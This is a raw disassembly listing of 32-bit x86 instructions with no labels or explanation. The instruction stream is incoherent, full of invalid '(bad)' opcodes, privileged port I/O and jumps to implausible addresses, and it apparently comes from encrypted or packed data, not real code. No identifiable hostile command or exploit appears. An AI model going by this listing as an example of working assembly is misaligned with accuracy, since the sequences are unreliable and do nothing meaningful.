  40a933:	leave  
  40a934:	sbb    eax,0xf6c6185
  40a939:	jp     0x40a8d3
  40a93b:	and    DWORD PTR [edx-0x58],esp
  40a93e:	pushf  
  40a93f:	add    esp,DWORD PTR [edx+0x49c475c2]
  40a945:	lds    eax,FWORD PTR [eax-0x36]
  40a948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a949:	mov    al,ds:0x26a24760
  40a94e:	mov    al,ds:0xbe5d5af6
  40a953:	test   eax,0xfc0d3473
  40a958:	out    0xc4,eax
  40a95a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a95b:	sbb    bl,BYTE PTR [eax+0x2708471a]
  40a961:	add    al,ah
  40a963:	cs jns 0x40a969
  40a966:	push   esp
  40a967:	xchg   edx,eax
  40a968:	adc    al,0x5f
  40a96a:	xchg   BYTE PTR [ebx],ch
  40a96c:	leave  
  40a96d:	push   edx
  40a96e:	test   BYTE PTR [eax+ebx*1],bl
  40a971:	inc    ebx
  40a972:	mov    ebx,0xd133ec9e
  40a977:	retf   0xc17c
  40a97a:	std    
  40a97b:	or     eax,0xef0e436c
  40a980:	or     al,ch
  40a982:	add    al,0x1a
  40a984:	ins    DWORD PTR es:[edi],dx
  40a985:	xor    eax,0x547a049e
  40a98a:	sahf   
  40a98b:	fistp  QWORD PTR [edx+0x17]
  40a98e:	daa    
  40a98f:	cmp    eax,0x17561504
  40a994:	dec    edx
  40a995:	inc    edx
  40a996:	mov    DWORD PTR [ecx-0x3eb0ddff],edx
  40a99c:	jle    0x40a9a3
  40a99e:	sub    eax,0xa0018612
  40a9a3:	sub    eax,0x7121a58
  40a9a8:	mov    al,ds:0xccad1743
  40a9ad:	and    ebp,DWORD PTR [edx]
  40a9af:	pop    esi
  40a9b0:	add    DWORD PTR [edi+0x1],esp
  40a9b3:	inc    ah
  40a9b5:	mov    dl,0x1b
  40a9b7:	cmp    ah,BYTE PTR [edi-0x35]
  40a9ba:	cmp    eax,0x1eb3e7c5
  40a9bf:	pusha  
  40a9c0:	(bad)  
  40a9c1:	es xor eax,0x77883b80
  40a9c7:	pusha  
  40a9c8:	add    al,0x9a
  40a9ca:	xor    al,0xda
  40a9cc:	mov    dh,BYTE PTR [edx]
  40a9ce:	rcl    BYTE PTR [ebp+ecx*4-0x32482c47],0x6d
  40a9d6:	xor    BYTE PTR [edi],ch
  40a9d8:	xor    ecx,DWORD PTR [ecx]
  40a9da:	push   es
  40a9db:	sahf   
  40a9dc:	mov    eax,ds:0x24a9c524
  40a9e1:	sahf   
  40a9e2:	cwde   
  40a9e3:	mov    DWORD PTR [esi],eax
  40a9e5:	adc    sp,bx
  40a9e8:	fldenv [ebp-0x4e]
  40a9eb:	pop    ds
  40a9ec:	inc    esi
  40a9ed:	push   es
  40a9ee:	rcl    bh,0x66
  40a9f1:	lea    edi,gs:[edi-0x48]
  40a9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f6:	xor    eax,0xd534ad0a
  40a9fb:	rcl    ebp,0x3e
  40a9fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9ff:	jge    0x40aa38
  40aa01:	mov    DWORD PTR [ebx],0xbbc6153b
  40aa07:	pop    eax
  40aa08:	or     al,0xb0
  40aa0a:	pop    eax
  40aa0b:	cmp    ebp,DWORD PTR [edx+0x77]
  40aa0e:	jns    0x40a995
  40aa10:	sti    
  40aa11:	pop    ebx
  40aa12:	mov    edx,0x7fb3eec6
  40aa17:	gs ss pop es
  40aa1a:	fist   WORD PTR [edi+eiz*2-0x6e]
  40aa1e:	fadd   DWORD PTR [eax]
  40aa20:	cmp    edi,DWORD PTR [ebp-0x49021ffd]
  40aa26:	frstor [eax]
  40aa28:	std    
  40aa29:	into   
  40aa2a:	retf   
  40aa2b:	pop    es
  40aa2c:	mov    ch,0x4
  40aa2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2f:	dec    edx
  40aa30:	mov    eax,ds:0x2ebb0630
  40aa35:	adc    DWORD PTR [ecx-0x5a],edi
  40aa38:	fwait
  40aa39:	cmp    al,0xd0
  40aa3b:	xor    ah,BYTE PTR [eax+esi*4+0x6a20b06e]
  40aa42:	mov    edx,0xfaf77fae
  40aa47:	aad    0xc5
  40aa49:	hlt    
  40aa4a:	ins    BYTE PTR es:[edi],dx
  40aa4b:	das    
  40aa4c:	cmp    ch,bl
  40aa4e:	lods   al,BYTE PTR ds:[esi]
  40aa4f:	push   0xffffffc6
  40aa51:	add    dh,BYTE PTR [ebx+0x24]
  40aa54:	ror    bl,cl
  40aa56:	into   
  40aa57:	pusha  
  40aa58:	sbb    esi,DWORD PTR [edx+0x4b3c6c5a]
  40aa5e:	repnz dec ecx
  40aa60:	adc    eax,0x58b489b5
  40aa65:	frstor [edx+0x6fa3967f]
  40aa6b:	or     ah,BYTE PTR [edi]
  40aa6d:	(bad)  
  40aa6f:	hlt    
  40aa70:	or     al,0xfc
  40aa72:	cdq    
  40aa73:	je     0x40aae0
  40aa75:	cmc    
  40aa76:	cld    
  40aa77:	or     al,0x2d
  40aa79:	sahf   
  40aa7a:	pop    esp
  40aa7b:	in     al,dx
  40aa7c:	cbw    
  40aa7e:	sbb    edx,DWORD PTR [ecx-0x1a905ff5]
  40aa84:	jp     0x40aa82
  40aa86:	lock mov WORD PTR [edx-0x2],?
  40aa8a:	(bad)  
  40aa8b:	(bad)  
  40aa8c:	js     0x40aa64
  40aa8e:	adc    al,0xdf
  40aa90:	xor    esi,DWORD PTR [ecx]
  40aa92:	gs aaa 
  40aa94:	outs   dx,BYTE PTR ds:[esi]
  40aa95:	inc    ecx
  40aa96:	stc    
  40aa97:	sti    
  40aa98:	ins    DWORD PTR es:[edi],dx
  40aa99:	jbe    0x40aa8c
  40aa9b:	pushf  
  40aa9c:	xchg   edx,eax
  40aa9d:	sub    eax,0x4bf08410
  40aaa2:	test   BYTE PTR [esi],0x0
  40aaa5:	xchg   bl,dh
  40aaa7:	arpl   sp,dx
  40aaa9:	(bad)  
  40aaaa:	loop   0x40aad9
  40aaac:	sub    ch,dl
  40aaae:	clc    
  40aaaf:	clc    
  40aab0:	inc    DWORD PTR [ebx+0x8aa8e2b]
  40aab6:	mov    ah,0x58
  40aab8:	fsub   QWORD PTR [esi+0x2]
  40aabb:	mov    al,dl
  40aabd:	ret    0x4d2d
  40aac0:	js     0x40aa42
  40aac2:	sbb    bl,BYTE PTR [ebx]
  40aac4:	mov    ah,0xa3
  40aac6:	add    al,0xf2
  40aac8:	pop    edx
  40aac9:	cdq    
  40aaca:	dec    esi
  40aacb:	push   esi
  40aacc:	(bad)  
  40aacd:	in     eax,0x38
  40aacf:	pusha  
  40aad0:	std    
  40aad1:	mov    ah,0x7d
  40aad3:	cmp    eax,0xc798a2f1
  40aad8:	(bad)  
  40aad9:	jmp    0x9fe2e955
  40aade:	jge    0x40aaf5
  40aae0:	ins    DWORD PTR es:[edi],dx
  40aae1:	add    ecx,ecx
  40aae3:	retf   
  40aae4:	(bad)  
  40aae5:	mov    al,ds:0x2a2c5b7f
  40aaea:	sahf   
  40aaeb:	sbb    esi,DWORD PTR [esi-0x21]
  40aaee:	out    dx,eax
  40aaef:	lods   eax,DWORD PTR ds:[esi]
  40aaf0:	scas   eax,DWORD PTR es:[edi]
  40aaf1:	mov    dl,0xc5
  40aaf3:	inc    ebp
  40aaf4:	mov    eax,ds:0xd689a3f9
  40aaf9:	sub    DWORD PTR [ecx],ebp
  40aafb:	fisttp DWORD PTR [si+0x7]
  40aaff:	cli    
  40ab00:	fbld   TBYTE PTR [edx]
  40ab02:	pushf  
  40ab03:	sbb    ch,BYTE PTR [edx-0x3c]
  40ab06:	push   cs
  40ab07:	icebp  
  40ab08:	cmp    BYTE PTR [ecx+0x14bf83bf],0x68
  40ab0f:	(bad)  
  40ab11:	inc    edi
  40ab12:	inc    esp
  40ab13:	outs   dx,DWORD PTR ds:[esi]
  40ab14:	test   BYTE PTR [eax-0x75],bh
  40ab17:	loop   0x40ab64
  40ab19:	mov    ah,0xab
  40ab1b:	gs (bad) 
  40ab1d:	(bad)  
  40ab1e:	jnp    0x40aacd
  40ab20:	ss add dl,bh
  40ab23:	and    al,0x85
  40ab25:	test   BYTE PTR [edi+0x6879c256],dl
  40ab2b:	mov    al,0x4c
  40ab2d:	cmp    ebx,DWORD PTR [ebx+0x70ba228f]
  40ab33:	xor    DWORD PTR ss:[edx+0x19],edx
  40ab37:	jmp    0x7a63:0x602b4ac3
  40ab3e:	xor    al,0xfa
  40ab40:	sbb    al,0xa4
  40ab42:	loopne 0x40aae2
  40ab44:	pop    es
  40ab45:	dec    edi
  40ab46:	sub    bl,BYTE PTR [esi+0x79]
  40ab49:	adc    bl,BYTE PTR [eax+eiz*4]
  40ab4c:	sti    
  40ab4d:	xchg   ebx,eax
  40ab4e:	pusha  
  40ab4f:	aad    0x96
  40ab51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab52:	stos   BYTE PTR es:[edi],al
  40ab53:	(bad)  
  40ab54:	mov    dl,BYTE PTR [edi-0x1d]
  40ab57:	or     al,0xeb
  40ab59:	pop    es
  40ab5a:	fs je  0x40aba2
  40ab5d:	js     0x40abb3
  40ab5f:	adc    DWORD PTR [ecx],0x8adf148c
  40ab65:	adc    ebx,DWORD PTR [edx+ebx*1+0x733e76aa]
  40ab6c:	pop    esi
  40ab6d:	xlat   BYTE PTR ds:[ebx]
  40ab6e:	fisub  WORD PTR [bp+di-0x3b]
  40ab72:	push   ecx
  40ab73:	inc    eax
  40ab74:	(bad)
  40ab78:	test   al,0x5c
  40ab7a:	repz (bad) 
  40ab7c:	shl    DWORD PTR [ecx-0x150834a],1
  40ab82:	xchg   DWORD PTR [edx+0x12],ebp
  40ab85:	out    dx,eax
  40ab86:	daa    
  40ab87:	mov    ah,0x2b
  40ab89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab8a:	sbb    dl,cl
  40ab8c:	jge    0x40ab54
  40ab8e:	mov    DWORD PTR [edi],edi
  40ab90:	clc    
  40ab91:	xor    eax,0xeb445fc6
  40ab96:	jge    0x40aba9
  40ab98:	cmp    DWORD PTR [edx+0x30],0xaa7dc06d
  40ab9f:	add    ebx,esi
  40aba1:	js     0x40abcf
  40aba3:	xor    eax,0x660d0d88
  40aba8:	arpl   WORD PTR [ebx],bx
  40abaa:	(bad)  
  40abac:	lds    edi,FWORD PTR [edi+0x25]
  40abaf:	add    BYTE PTR [esi+edi*2-0x7a],0x5d
  40abb4:	xor    BYTE PTR [ecx],ch
  40abb6:	into   
  40abb7:	enter  0xc72e,0x2b
  40abbb:	imul   esp,DWORD PTR [esi-0x4cc0ca9c],0x53
  40abc2:	loop   0x40abc3
  40abc4:	lods   eax,DWORD PTR ds:[esi]
  40abc5:	inc    ebx
  40abc6:	int    0x2f
  40abc8:	arpl   WORD PTR [ebx-0x5d],bp
  40abcb:	sar    DWORD PTR [esi+esi*1-0x70d360fb],0xed
  40abd3:	repz shl BYTE PTR cs:[esi+0x5b],0xd7
  40abd9:	scas   eax,DWORD PTR es:[edi]
  40abda:	sub    edi,ebp
  40abdc:	adc    al,0x60
  40abde:	push   ss
  40abdf:	mov    eax,ds:0x235eb724
  40abe4:	outs   dx,BYTE PTR ds:[esi]
  40abe5:	call   0xa1b61c5e
  40abea:	mov    ds:0x25f1234b,eax
  40abef:	jo     0x40ac06
  40abf1:	xchg   esi,esi
  40abf3:	fstp   DWORD PTR [edi+0x4113e532]
  40abf9:	int3   
  40abfa:	sub    DWORD PTR [edx],eax
  40abfc:	mov    dh,0xf2
  40abfe:	mov    ebx,DWORD PTR [ebp-0x3235abca]
  40ac04:	pop    ss
  40ac05:	mov    ds:0x49a924a7,eax
  40ac0a:	jnp    0x40abc5
  40ac0c:	(bad)  
  40ac0d:	mov    ecx,0x4b8facca
  40ac12:	retf   0xc18
  40ac15:	pusha  
  40ac16:	(bad)  
  40ac17:	ficom  DWORD PTR [edi-0x8]
  40ac1a:	jnp    0x40ac1d
  40ac1c:	fsubr  st(0),st
  40ac1e:	xchg   si,ax
  40ac20:	or     al,0x0
  40ac22:	das    
  40ac23:	cwde   
  40ac24:	xchg   ecx,eax
  40ac25:	aaa    
  40ac26:	mov    al,ds:0x7009eb5e
  40ac2b:	imul   edi,eax,0x5
  40ac2e:	adc    BYTE PTR [eax-0x70],dh
  40ac31:	push   DWORD PTR [esi]
  40ac33:	scas   eax,DWORD PTR es:[edi]
  40ac34:	pop    ebx
  40ac35:	and    edi,DWORD PTR [edi+0xb]
  40ac38:	into   
  40ac39:	test   eax,0xc09dda08
  40ac3e:	mov    ebp,0xbe6c068
  40ac43:	sbb    DWORD PTR [eax+ebx*4+0x38],0x61
  40ac48:	sti    
  40ac49:	inc    ebp
  40ac4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac4b:	ret    0xeb7e
  40ac4e:	jecxz  0x40ac1c
  40ac50:	popf   
  40ac51:	popfw  
  40ac53:	dec    ecx
  40ac54:	mov    ds:0x59833161,al
  40ac59:	jg     0x40ac48
  40ac5b:	cdq    
  40ac5c:	xor    ecx,DWORD PTR [eax+0x46]
  40ac5f:	jmp    0x40ac4e
  40ac61:	fs and ah,cl
  40ac64:	sbb    al,0x4
  40ac66:	mov    DWORD PTR [eax+edx*2-0x3e047cf8],eax
  40ac6d:	mov    edi,0x3f08e537
  40ac72:	push   ss
  40ac73:	call   0xcec8e4c2
  40ac78:	mov    esi,0x5b677a01
  40ac7d:	mov    cl,0x5f
  40ac7f:	inc    DWORD PTR [edx+esi*1+0x71]
  40ac83:	(bad)  
  40ac85:	rcl    ebx,0x2e
  40ac88:	stos   BYTE PTR es:[edi],al
  40ac89:	sahf   
  40ac8a:	jp     0x40ac57
  40ac8c:	sub    dh,cl
  40ac8e:	icebp  
  40ac8f:	test   al,0x25
  40ac91:	cmp    ecx,DWORD PTR [edi]
  40ac93:	mov    esp,0xa1fac836
  40ac98:	xchg   esp,eax
  40ac99:	xchg   ebx,eax
  40ac9a:	xor    ebp,edx
  40ac9c:	scas   eax,DWORD PTR es:[edi]
  40ac9d:	pop    es
  40ac9e:	cld    
  40ac9f:	or     eax,0x1260cd4a
  40aca4:	loope  0x40ac61
  40aca6:	and    DWORD PTR [ebx+0x5bb19145],eax
  40acac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acad:	pop    ebp
  40acae:	jns    0x40acaf
  40acb0:	inc    esp
  40acb1:	jno    0x40acab
  40acb3:	and    ecx,DWORD PTR [edx+0x6]
  40acb6:	nop
  40acb7:	aas    
  40acb8:	and    al,0xb0
  40acba:	pushf  
  40acbb:	dec    edi
  40acbc:	pushf  
  40acbd:	jge    0x40ac46
  40acbf:	cmp    al,0xc2
  40acc1:	cs push esi
  40acc3:	in     al,0x71
  40acc5:	fs data16 xor al,al
  40acc9:	scas   eax,DWORD PTR es:[edi]
  40acca:	(bad)  
  40accb:	fild   WORD PTR [edx]
  40accd:	(bad)  
  40acce:	test   al,0xf5
  40acd0:	jmp    0xa2f37174
  40acd5:	mov    ebp,0x351cf943
  40acda:	push   eax
  40acdb:	imul   eax,DWORD PTR [edx-0x22],0xbeaf2276
  40ace2:	loopne 0x40ac82
  40ace4:	test   DWORD PTR [edi],ebx
  40ace6:	gs hlt 
  40ace8:	dec    esi
  40ace9:	xchg   ebp,eax
  40acea:	adc    ebx,edi
  40acec:	cmp    ecx,DWORD PTR [eax+0x6358eab3]
  40acf2:	lods   eax,DWORD PTR ds:[esi]
  40acf3:	add    DWORD PTR [ebp-0xa],edi
  40acf6:	dec    ecx
  40acf7:	inc    edx
  40acf8:	je     0x40ad0d
  40acfa:	mov    edi,0x764f2f72
  40acff:	test   DWORD PTR [eax],eax
  40ad01:	mov    bl,0xb6
  40ad03:	rol    DWORD PTR gs:[edx-0x24],0xa4
  40ad08:	ds pop esi
  40ad0a:	mov    esp,0xddf47de
  40ad0f:	add    eax,0xcc6412dc
  40ad14:	jl     0x40ad0d
  40ad16:	mov    cl,0xe
  40ad18:	xor    al,0x5f
  40ad1a:	mov    esi,0x3af59e40
  40ad1f:	test   eax,0xe47633e1
  40ad24:	aaa    
  40ad25:	hlt    
  40ad26:	mov    ch,0x21
  40ad28:	or     BYTE PTR [edx-0x1d],bh
  40ad2b:	scas   eax,DWORD PTR es:[edi]
  40ad2c:	pop    esp
  40ad2d:	or     al,0x75
  40ad2f:	icebp  
  40ad30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad31:	ja     0x40ad5a
  40ad33:	sub    ebp,DWORD PTR [edx-0x9]
  40ad36:	vmread DWORD PTR [edx],ecx
  40ad39:	jg     0x40acc4
  40ad3b:	jg     0x40aced
  40ad3d:	xor    eax,DWORD PTR [edx-0x7e]
  40ad40:	xlat   BYTE PTR ds:[ebx]
  40ad41:	mov    eax,0xccc15726
  40ad46:	mov    eax,0x4575771
  40ad4b:	xchg   ebp,eax
  40ad4c:	not    BYTE PTR [edx-0x65]
  40ad4f:	ds imul ecx,edi,0xb6151d2d
  40ad56:	jmp    0x40acd9
  40ad58:	mov    BYTE PTR [ecx-0x2bc9d6db],al
  40ad5e:	bound  ebx,QWORD PTR [edi+0x6036c27c]
  40ad64:	jl     0x40acf8
  40ad66:	inc    edi
  40ad67:	lods   eax,DWORD PTR ds:[esi]
  40ad68:	lods   eax,DWORD PTR ds:[esi]
  40ad69:	xchg   esp,eax
  40ad6a:	cld    
  40ad6b:	ja     0x40ad82
  40ad6d:	xchg   ebx,eax
  40ad6e:	outs   dx,BYTE PTR ds:[esi]
  40ad6f:	neg    BYTE PTR [esi]
  40ad71:	scas   al,BYTE PTR es:[edi]
  40ad72:	daa    
  40ad73:	or     DWORD PTR [ebx-0x36d35baf],0x5aa45434
  40ad7d:	into   
  40ad7e:	int3   
  40ad7f:	div    DWORD PTR [edx]
  40ad81:	ret    0xad54
  40ad84:	or     BYTE PTR [edi-0x66389f1f],0x23
  40ad8b:	xor    dl,BYTE PTR [eax]
  40ad8d:	lock nop
  40ad8f:	mov    edx,0x6891701f
  40ad94:	in     al,0x4a
  40ad96:	pop    ds
  40ad97:	cli    
  40ad98:	mov    WORD PTR [edx-0x64ae507a],?
  40ad9e:	xor    BYTE PTR [edi+0x18],0x8
  40ada2:	pop    edx
  40ada3:	test   DWORD PTR [ecx],esp
  40ada5:	add    cl,ch
  40ada7:	dec    ecx
  40ada8:	mov    DWORD PTR [ebp+0x75f5186e],esp
  40adae:	sbb    cl,BYTE PTR [edi+0x3058fef3]
  40adb4:	icebp  
  40adb5:	push   edi
  40adb6:	sbb    dl,BYTE PTR [eax-0x15]
  40adb9:	sbb    al,0x88
  40adbb:	ins    DWORD PTR es:[edi],dx
  40adbc:	pop    ds
  40adbd:	pop    edx
  40adbe:	mov    ds:0x1a3d0860,eax
  40adc3:	cmp    esi,DWORD PTR [edx-0x1d]
  40adc6:	dec    esi
  40adc7:	and    eax,0xb8d7e1f8
  40adcc:	fstp   QWORD PTR [ecx+0x47c24c0a]
  40add2:	pop    es
  40add3:	sub    eax,0x74274ddb
  40add8:	sahf   
  40add9:	xchg   esp,eax
  40adda:	sbb    ebp,DWORD PTR [eax]
  40addc:	or     ebp,ebp
  40adde:	xor    eax,0xb9f7d843
  40ade3:	cwde   
  40ade4:	sbb    eax,0xb41a12ba
  40ade9:	jnp    0x40ae27
  40adeb:	test   al,0xf3
  40aded:	fnstsw WORD PTR [esi-0x79de7dc6]
  40adf3:	test   DWORD PTR [ecx-0x21c28489],0xe7ddd466
  40adfd:	adc    al,BYTE PTR [edx+0x455e2ad7]
  40ae03:	xor    dl,BYTE PTR [edx]
  40ae05:	pop    esi
  40ae06:	arpl   si,ax
  40ae08:	push   es
  40ae09:	in     al,0x84
  40ae0b:	in     eax,0x20
  40ae0d:	inc    esp
  40ae0e:	mov    ds:0x431e4449,eax
  40ae13:	mov    al,0x26
  40ae15:	nop
  40ae16:	pusha  
  40ae17:	jle    0x40ae73
  40ae19:	shl    DWORD PTR [ebx],cl
  40ae1b:	jge    0x40ae18
  40ae1d:	sbb    bh,BYTE PTR [eax]
  40ae1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae20:	clc    
  40ae21:	pop    edx
  40ae22:	pop    ds
  40ae23:	out    dx,al
  40ae24:	add    edx,DWORD PTR [eax]
  40ae26:	and    BYTE PTR [ebx-0x24d19fdd],bh
  40ae2c:	sbb    BYTE PTR [eax],cl
  40ae2e:	ror    DWORD PTR [edi],1
  40ae30:	add    DWORD PTR [ebp-0x70],edx
  40ae33:	(bad)  
  40ae34:	test   eax,0x233e3aa
  40ae39:	sbb    al,0xff
  40ae3b:	mov    ecx,0xf48ee56a
  40ae40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae41:	xchg   ebx,eax
  40ae42:	jae    0x40ae61
  40ae44:	pushf  
  40ae45:	or     eax,0x927d588d
  40ae4a:	jae    0x40ae2e
  40ae4c:	fwait
  40ae4d:	cmp    al,0x64
  40ae4f:	imul   eax,DWORD PTR [ecx-0x22],0x293caea8
  40ae56:	pusha  
  40ae57:	mov    esp,0xe53e90b7
  40ae5c:	cmp    al,0xe7
  40ae5e:	mov    cl,0xe1
  40ae60:	dec    esp
  40ae61:	xchg   edi,eax
  40ae62:	int3   
  40ae63:	popa   
  40ae64:	mov    eax,ds:0x642e79b4
  40ae69:	je     0x40aea4
  40ae6b:	cmp    cl,0x14
  40ae6e:	test   al,0x9c
  40ae70:	jl     0x40aeb1
  40ae72:	pop    es
  40ae73:	mov    ch,0xc
  40ae75:	nop
  40ae76:	dec    eax
  40ae77:	jle    0x40aed2
  40ae79:	mov    eax,0x2965431d
  40ae7e:	cmc    
  40ae7f:	push   eax
  40ae80:	cmp    al,0x80
  40ae82:	xchg   ebp,eax
  40ae83:	and    eax,DWORD PTR ds:0x9b07834f
  40ae89:	pop    DWORD PTR [esi-0x1c]
  40ae8c:	jmp    0xd0a8:0x5878bba1
  40ae93:	aas    
  40ae94:	sahf   
  40ae95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae96:	jmp    0x40af01
  40ae98:	shr    BYTE PTR [ecx-0xf],cl
  40ae9b:	adc    eax,DWORD PTR [ecx-0x60e90670]
  40aea1:	pop    edi
  40aea2:	lea    edx,[ecx]
  40aea4:	cmp    BYTE PTR [esp+ebx*8+0x28],0xf2
  40aea9:	cmp    eax,DWORD PTR [edi+0x66]
  40aeac:	out    dx,al
  40aead:	sbb    esi,DWORD PTR [esi+0x1f]
  40aeb0:	sbb    ch,ch
  40aeb2:	jp     0x40ae57
  40aeb4:	mov    esp,0x636176c5
  40aeb9:	jnp    0x40ae41
  40aebb:	clc    
  40aebc:	idiv   ebx
  40aebe:	bnd jge 0x40ae92
  40aec1:	xchg   esp,eax
  40aec2:	xor    eax,0x168ef7fb
  40aec7:	addr16 fcom st(2)
  40aeca:	out    dx,eax
  40aecb:	clc    
  40aecc:	lock stos BYTE PTR es:[edi],al
  40aece:	sub    esi,DWORD PTR [ecx-0x4a]
  40aed1:	imul   esi,DWORD PTR ds:0xe61ab661,0xe1fa644a
  40aedb:	(bad)  
  40aedc:	push   ds
  40aedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aede:	aam    0xdf
  40aee0:	(bad)  
  40aee1:	jge    0x40af44
  40aee3:	mov    eax,ds:0x2718a080
  40aee8:	std    
  40aee9:	ja     0x40aeeb
  40aeeb:	push   edx
  40aeec:	mov    cl,0x38
  40aeee:	adc    DWORD PTR [esi],ebx
  40aef0:	xchg   DWORD PTR [edx+0xd],edx
  40aef3:	rcr    BYTE PTR [edi+0x6e],cl
  40aef6:	cdq    
  40aef7:	mov    al,dl
  40aef9:	jae    0x40aef9
  40aefb:	stc    
  40aefc:	outs   dx,DWORD PTR ds:[esi]
  40aefd:	mov    eax,ds:0x32eb86a6
  40af02:	mov    eax,ds:0x571bfe07
  40af07:	add    al,0x8c
  40af09:	mov    ebp,0x4ca233a7
  40af0e:	xor    BYTE PTR [ebp+0x1c],bh
  40af11:	jne    0x40aecf
  40af13:	mov    ebx,0x20754dff
  40af18:	lock ja 0x40af3a
  40af1b:	repz xchg ecx,eax
  40af1d:	stos   BYTE PTR es:[edi],al
  40af1e:	call   0xb83c:0x99a56b85
  40af25:	aaa    
  40af26:	sbb    eax,DWORD PTR [edi]
  40af28:	ds dec eax
  40af2a:	and    dl,BYTE PTR [edx+0xe]
  40af2d:	push   ecx
  40af2e:	sar    DWORD PTR [edx+eiz*1+0x48],1
  40af32:	aad    0x97
  40af34:	sub    DWORD PTR [ebp-0x80],ebp
  40af37:	or     DWORD PTR [ecx],ebp
  40af39:	jnp    0x40af08
  40af3b:	push   ds
  40af3c:	jae    0x40af3d
  40af3e:	sbb    eax,0x9a96f26f
  40af43:	pop    eax
  40af44:	gs fdivr st,st(7)
  40af47:	mov    al,0x75
  40af49:	aad    0x0
  40af4b:	cs aam 0xe4
  40af4e:	or     eax,0xe2f4e80c
  40af53:	mov    al,ds:0x73edce74
  40af58:	ret    
  40af59:	add    DWORD PTR [eax-0x6e],eax
  40af5c:	cli    
  40af5d:	dec    edi
  40af5e:	or     al,0xb7
  40af60:	hlt    
  40af61:	hlt    
  40af62:	das    
  40af63:	xor    BYTE PTR [ebx+0x54f6e91c],0x30
  40af6a:	jg     0x40af1f
  40af6c:	loopne 0x40af3c
  40af6e:	(bad)  
  40af6f:	jo     0x40af39
  40af71:	fs int3 
  40af73:	ins    BYTE PTR es:[edi],dx
  40af74:	jns    0x40af11
  40af76:	mov    al,ds:0x8173ddeb
  40af7b:	shl    ebx,cl
  40af7d:	rol    DWORD PTR [ebp+eax*8-0x2c],1
  40af81:	jnp    0x40afed
  40af83:	xlat   BYTE PTR ds:[ebx]
  40af84:	icebp  
  40af85:	cs xor esi,ebx
  40af88:	lods   al,BYTE PTR ds:[esi]
  40af89:	pop    ebx
  40af8a:	int3   
  40af8b:	je     0x40af3b
  40af8d:	cmp    ch,cl
  40af8f:	sar    BYTE PTR [edx-0x1ba94c9b],cl
  40af95:	mov    al,0xa5
  40af97:	aas    
  40af98:	xor    BYTE PTR [ecx],0xd7
  40af9b:	cmp    al,BYTE PTR [edi]
  40af9d:	repz ror BYTE PTR [ebp-0x59],1
  40afa1:	bound  ebp,QWORD PTR [eax-0x5384f1ae]
  40afa7:	jnp    0x40af53
  40afa9:	lds    eax,FWORD PTR [ecx]
  40afab:	sbb    DWORD PTR [ebx+0x5f],edx
  40afae:	push   edi
  40afaf:	shl    DWORD PTR [eax+0x4bedb46f],0x22
  40afb6:	inc    esi
  40afb7:	test   BYTE PTR [esi+ecx*1],bl
  40afba:	sbb    esi,edi
  40afbc:	data16 shl BYTE PTR [ecx],0x63
  40afc0:	rcl    eax,cl
  40afc2:	(bad)  
  40afc3:	xor    eax,0x16998c97
  40afc8:	add    bl,dl
  40afca:	dec    eax
  40afcb:	cmp    BYTE PTR [edi-0x3b],dh
  40afce:	bound  esi,QWORD PTR [edi]
  40afd0:	outs   dx,DWORD PTR ds:[esi]
  40afd1:	mov    ?,edi
  40afd3:	test   BYTE PTR [ebx],bl
  40afd5:	or     DWORD PTR [ebx+esi*8+0x67],0x9676a165
  40afdd:	rcr    ecx,0x19
  40afe0:	jo     0x40b035
  40afe2:	shl    DWORD PTR [ecx+0x6f2127c2],0x96
  40afe9:	push   0xf87802d6
  40afee:	fbld   TBYTE PTR [ebp-0x4a]
  40aff1:	jl     0x40b012
  40aff3:	scas   al,BYTE PTR es:[edi]
  40aff4:	pop    ebx
  40aff5:	mov    ecx,0x79761f27
  40affa:	pusha  
  40affb:	mov    ds:0xb4e7c5a0,al
  40b000:	dec    ecx
  40b001:	jmp    0x40b056
  40b003:	in     eax,dx
  40b004:	(bad)  
  40b005:	test   DWORD PTR [eax-0x1fbad22f],0xc1029c0d
  40b00f:	mov    ebp,0x662a6e77
  40b014:	jne    0x40b010
  40b016:	adc    edx,DWORD PTR [ecx+0x23156ceb]
  40b01c:	arpl   WORD PTR [ecx],bx
  40b01e:	jbe    0x40b00e
  40b020:	addr16 sub al,0x24
  40b023:	cmp    ebp,ebx
  40b025:	sub    bl,ch
  40b027:	aas    
  40b028:	(bad)  
  40b029:	in     al,0xa4
  40b02b:	jne    0x40b090
  40b02d:	ds mov ebp,0xfe7fc4a3
  40b033:	push   esi
  40b034:	xor    ch,BYTE PTR [eax]
  40b036:	jmp    0xbd5d9650
  40b03b:	inc    ecx
  40b03c:	push   0xb4b91513
  40b041:	mov    WORD PTR [ebp-0x4b],?
  40b044:	dec    ebp
  40b045:	daa    
  40b046:	adc    al,0xd2
  40b048:	out    0x26,al
  40b04a:	pop    ss
  40b04b:	clc    
  40b04c:	dec    ecx
  40b04d:	and    edx,ecx
  40b04f:	push   esp
  40b050:	cmp    ebp,DWORD PTR [edi+0x4b]
  40b053:	sbb    BYTE PTR [ebp-0x453cc4ef],bl
  40b059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b05a:	push   ss
  40b05b:	je     0x40b079
  40b05d:	xchg   esi,eax
  40b05e:	xchg   ebp,eax
  40b05f:	nop
  40b060:	fadd   DWORD PTR [edi+0x56883565]
  40b066:	outs   dx,BYTE PTR ds:[esi]
  40b067:	mov    esi,0x7242e547
  40b06c:	aam    0x45
  40b06e:	lods   al,BYTE PTR cs:[esi]
  40b070:	loope  0x40b0db
  40b072:	and    edi,DWORD PTR [esi-0x2f925fc4]
  40b078:	xchg   DWORD PTR [edx+edi*2],esi
  40b07b:	or     BYTE PTR [ebx],bh
  40b07d:	or     esi,DWORD PTR [edx-0x69165822]
